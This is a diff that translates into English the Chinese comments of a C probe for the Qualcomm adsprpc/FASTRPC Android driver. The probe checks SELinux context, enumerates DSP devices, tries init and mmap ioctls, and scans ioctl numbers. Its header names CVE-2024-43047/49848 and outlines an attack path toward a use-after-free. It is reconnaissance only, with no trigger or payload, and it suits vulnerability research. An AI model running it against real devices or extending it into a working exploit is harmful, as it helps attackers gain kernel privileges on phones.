@@ -1,18 +1,18 @@
 /*
- * adsprpc_mmap_probe.c - 深入探測 FASTRPC MMAP 功能
+ * adsprpc_mmap_probe.c - in-depth probing of the FASTRPC MMAP feature
  *
- * 發現：
- * - MMAP (0xc0285206) 返回 errno=44 (Channel out of range)
- * - GETINFO_R (0xc0045208) 返回 errno=13 (Permission denied)
+ * Findings:
+ * - MMAP (0xc0285206) returns errno=44 (Channel out of range)
+ * - GETINFO_R (0xc0045208) returns errno=13 (Permission denied)
  *
- * 這表明需要先初始化 channel，然後才能使用 MMAP
+ * This indicates the channel must be initialized before MMAP can be used
  *
- * CVE-2024-43047/49848 攻擊路徑:
- * 1. 透過 fastrpc_internal_mmap 建立映射
- * 2. 觸發 map collision 或 KEEP_MAP 邏輯漏洞
- * 3. 獲得 UAF 條件
+ * CVE-2024-43047/49848 attack path:
+ * 1. Establish a mapping through fastrpc_internal_mmap
+ * 2. Trigger the map collision or KEEP_MAP logic flaw
+ * 3. Obtain the UAF condition
  *
- * 編譯:
+ * Build:
  * aarch64-linux-android31-clang -static -O2 -o adsprpc_mmap_probe adsprpc_mmap_probe.c
  */
 
@@ -29,15 +29,15 @@
 #include <stdint.h>
 
 /*
- * 正確的 FASTRPC IOCTL 定義
- * 基於 adsprpc 驅動源碼分析
+ * Correct FASTRPC IOCTL definitions
+ * Based on analysis of the adsprpc driver source
  */
 
-/* 已確認有效的 ioctl 命令 */
-#define FASTRPC_IOCTL_MMAP 0xc0285206    // errno=44 - 需要正確的 channel
-#define FASTRPC_IOCTL_GETINFO 0xc0045208 // errno=13 - 需要權限
+/* ioctl commands confirmed to work */
+#define FASTRPC_IOCTL_MMAP 0xc0285206    // errno=44 - needs the correct channel
+#define FASTRPC_IOCTL_GETINFO 0xc0045208 // errno=13 - permission required
 
-/* 其他可能的命令 */
+/* other possible commands */
 #define FASTRPC_IOCTL_INVOKE 0xc0485201
 #define FASTRPC_IOCTL_INIT 0xc0185203
 #define FASTRPC_IOCTL_INIT_ATTRS 0xc0205204
@@ -58,7 +58,7 @@
 #define FASTRPC_INIT_CREATE 1
 #define FASTRPC_INIT_CREATE_STATIC 2
 
-/* fastrpc_ioctl_init 結構 (嘗試不同版本) */
+/* fastrpc_ioctl_init structure (different versions tried) */
 struct fastrpc_ioctl_init_v1
 {
     uint32_t flags;   /* FASTRPC_INIT_* */
@@ -68,7 +68,7 @@ struct fastrpc_ioctl_init_v1
     uint32_t mem;     /* unused, set to 0 */
 };
 
-/* 較新版本的 init 結構 */
+/* newer version of the init structure */
 struct fastrpc_ioctl_init_attrs
 {
     uint32_t flags;   /* FASTRPC_INIT_* */
@@ -82,7 +82,7 @@ struct fastrpc_ioctl_init_attrs
     uint32_t siglen;  /* signature length */
 };
 
-/* MMAP 結構 */
+/* MMAP structure */
 struct fastrpc_ioctl_mmap
 {
     int32_t fd;        /* ion fd */
@@ -92,14 +92,14 @@ struct fastrpc_ioctl_mmap
     uint64_t vaddrout; /* virtual address out */
 };
 
-/* MUNMAP 結構 */
+/* MUNMAP structure */
 struct fastrpc_ioctl_munmap
 {
     uint64_t vaddrout; /* virtual address out */
     uint64_t size;     /* size */
 };
 
-/* GETINFO 結構 */
+/* GETINFO structure */
 struct fastrpc_ioctl_info
 {
     uint32_t domain;
@@ -107,7 +107,7 @@ struct fastrpc_ioctl_info
     uint32_t capability;
 };
 
-/* CONTROL 結構 */
+/* CONTROL structure */
 struct fastrpc_ctrl_latency
 {
     uint32_t req;     /* request type */
@@ -119,7 +119,7 @@ void test_init_attach(int fd)
 {
     printf("\n[*] Testing INIT_ATTACH on different domains...\n");
 
-    // 嘗試不同的初始化結構和 domain
+    // Try different init structures and domains
     for (int domain = 0; domain <= 3; domain++)
     {
         struct fastrpc_ioctl_init_v1 init = {0};
@@ -127,14 +127,14 @@ void test_init_attach(int fd)
         init.file = 0;
         init.filelen = 0;
         init.filefd = -1;
-        init.mem = domain; // 有時候 domain 在這裡傳遞
+        init.mem = domain; // sometimes the domain is passed here
 
         errno = 0;
         int ret = ioctl(fd, FASTRPC_IOCTL_INIT, &init);
         printf("  Domain %d (INIT 0xc0185203): ret=%d, errno=%d (%s)\n",
                domain, ret, errno, ret < 0 ? strerror(errno) : "OK");
 
-        // 嘗試 INIT_ATTRS
+        // Try INIT_ATTRS
         struct fastrpc_ioctl_init_attrs init_attrs = {0};
         init_attrs.flags = FASTRPC_INIT_ATTACH;
         init_attrs.filefd = -1;
@@ -151,11 +151,11 @@ void test_mmap_with_params(int fd)
 {
     printf("\n[*] Testing MMAP with various parameters...\n");
 
-    // 嘗試不同的 MMAP 參數組合
+    // Try different MMAP parameter combinations
     struct fastrpc_ioctl_mmap mmap_req = {0};
 
-    // 嘗試 1: 簡單的 mmap
-    mmap_req.fd = -1; // 無 ION fd
+    // Attempt 1: a simple mmap
+    mmap_req.fd = -1; // no ION fd
     mmap_req.flags = 0;
     mmap_req.vaddrin = 0;
     mmap_req.size = 4096;
@@ -166,7 +166,7 @@ void test_mmap_with_params(int fd)
     printf("  fd=-1, size=4096: ret=%d, errno=%d (%s)\n",
            ret, errno, ret < 0 ? strerror(errno) : "OK");
 
-    // 嘗試 2: 使用 /dev/ion (如果存在)
+    // Attempt 2: use /dev/ion (if present)
     int ion_fd = open("/dev/ion", O_RDWR);
     if (ion_fd >= 0)
     {
@@ -190,7 +190,7 @@ void test_mmap_with_params(int fd)
         printf("  [-] /dev/ion not accessible: %s\n", strerror(errno));
     }
 
-    // 嘗試 3: 使用 dmabuf heap (新的 API)
+    // Attempt 3: use the dmabuf heap (newer API)
     int dmabuf_fd = open("/dev/dma_heap/system", O_RDWR);
     if (dmabuf_fd >= 0)
     {
@@ -198,7 +198,7 @@ void test_mmap_with_params(int fd)
         close(dmabuf_fd);
     }
 
-    // 嘗試用 memfd
+    // Try memfd
     int memfd = syscall(319, "fastrpc_test", 0); // memfd_create
     if (memfd >= 0)
     {
@@ -242,7 +242,7 @@ void test_other_adsprpc_devices(void)
         {
             printf("  [+] %s: ACCESSIBLE (fd=%d)\n", devices[i], fd_read);
 
-            // 嘗試一下 GETINFO
+            // Try GETINFO
             uint32_t info = 0;
             errno = 0;
             int ret = ioctl(fd_read, FASTRPC_IOCTL_GETINFO, &info);
@@ -255,7 +255,7 @@ void test_other_adsprpc_devices(void)
             printf("  [-] %s: %s\n", devices[i], strerror(errno));
         }
 
-        // 也嘗試 O_RDWR
+        // Also try O_RDWR
         int fd_write = open(devices[i], O_RDWR);
         if (fd_write >= 0)
         {
@@ -271,10 +271,10 @@ void scan_ioctl_deep(int fd)
 
     char buf[4096] = {0};
 
-    // 基於 52XX 掃描 (0x52 = 'R' 可能是 fastrpc 的 magic)
+    // Scan based on 52XX (0x52 = 'R' may be the fastrpc magic)
     printf("  Scanning 0xc0XX5200-0xc0XX5220 range...\n");
 
-    // 不同大小的結構
+    // Structures of different sizes
     unsigned int size_prefixes[] = {
         0xc0040000, // 4 bytes
         0xc0080000, // 8 bytes
@@ -299,7 +299,7 @@ void scan_ioctl_deep(int fd)
             errno = 0;
             int ret = ioctl(fd, cmd, buf);
 
-            // 只顯示非 ENOTTY 錯誤
+            // Only show non-ENOTTY errors
             if (errno != 25)
             { // ENOTTY = 25
                 printf("    [!] ioctl(0x%08x): ret=%d, errno=%d (%s)\n",
@@ -313,7 +313,7 @@ void check_selinux_context(void)
 {
     printf("\n[*] Checking SELinux context...\n");
 
-    // 讀取當前進程的 SELinux context
+    // Read the current process's SELinux context
     char context[256] = {0};
     int fd = open("/proc/self/attr/current", O_RDONLY);
     if (fd >= 0)
@@ -337,7 +337,7 @@ void check_selinux_context(void)
         fprintf(stderr, "[-] Failed to open /proc/self/attr/current: %s\n", strerror(errno));
     }
 
-    // 檢查 adsprpc-smd 的 context
+    // Check the context of adsprpc-smd
     fd = open("/sys/class/misc/adsprpc-smd/device/uevent", O_RDONLY);
     if (fd >= 0)
     {
@@ -366,7 +366,7 @@ void enumerate_dsp_processes(void)
 {
     printf("\n[*] DSP-related processes:\n");
 
-    // 這裡只是展示應該在設備上執行的命令
+    // This only shows the commands that should be run on the device
     printf("  Run: ps -ef | grep -E 'dsp|adsp|cdsp|sdsp|fastrpc'\n");
     printf("  Run: ls -la /dev/*dsp* /dev/*fastrpc* 2>/dev/null\n");
 }
@@ -377,13 +377,13 @@ int main(int argc, char **argv)
     printf("Targeting CVE-2024-43047/49848 exploitation path\n");
     printf("===========================\n");
 
-    // 檢查 SELinux
+    // Check SELinux
     check_selinux_context();
 
-    // 枚舉其他 ADSPRPC 設備
+    // Enumerate the other ADSPRPC devices
     test_other_adsprpc_devices();
 
-    // 打開主設備
+    // Open the main device
     printf("\n[*] Opening /dev/adsprpc-smd O_RDONLY...\n");
     int fd = open("/dev/adsprpc-smd", O_RDONLY);
     if (fd < 0)
@@ -393,16 +393,16 @@ int main(int argc, char **argv)
     }
     printf("[+] Success: fd=%d\n", fd);
 
-    // 測試初始化
+    // Test initialization
     test_init_attach(fd);
 
-    // 測試 MMAP
+    // Test MMAP
     test_mmap_with_params(fd);
 
-    // 深度掃描 ioctl
+    // Deep ioctl scan
     scan_ioctl_deep(fd);
 
-    // 展示相關進程資訊
+    // Show related process information
     enumerate_dsp_processes();
 
     printf("\n=== Analysis ===\n");
